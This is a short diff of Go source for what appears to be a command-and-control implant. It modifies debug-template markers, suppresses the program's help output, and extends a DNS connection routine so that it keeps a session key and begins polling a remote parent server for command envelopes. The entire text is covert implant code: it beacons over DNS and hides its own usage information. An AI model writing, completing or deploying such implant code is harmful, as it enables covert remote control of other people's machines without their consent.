@@ -8,8 +8,7 @@ import (
 	"os/user"
 	"runtime"
 
-	// {{if .Debug}}
-	// {{else}}
+	// {{if .Debug}}{{else}}
 	"io/ioutil"
 	// {{end}}
 
@@ -56,8 +55,7 @@ func main() {
 	server = flag.String("server", defaultServerIP, "")
 	lport = flag.Int("lport", defaultServerLport, "")
 
-	// {{if .Debug}}
-	// {{else}}
+	// {{if .Debug}}{{else}}
 	flag.Usage = func() {} // No help!
 	// {{end}}
 
@@ -141,13 +139,18 @@ func dnsConnect() error {
 	// {{if .Debug}}
 	log.Printf("Attempting to connect via DNS via parent: %s\n", dnsParent)
 	// {{end}}
-	sessionID, _, err := dnsStartSession(dnsParent)
+	sessionID, sessionKey, err := dnsStartSession(dnsParent)
 	if err != nil {
 		return err
 	}
 	// {{if .Debug}}
 	log.Printf("Starting new session with id = %s\n", sessionID)
 	// {{end}}
+
+	recv := make(chan *pb.Envelope)
+	ctrl := make(chan bool)
+	dnsSessionPoll(dnsParent, sessionID, sessionKey, ctrl, recv)
+
 	return nil
 }
 
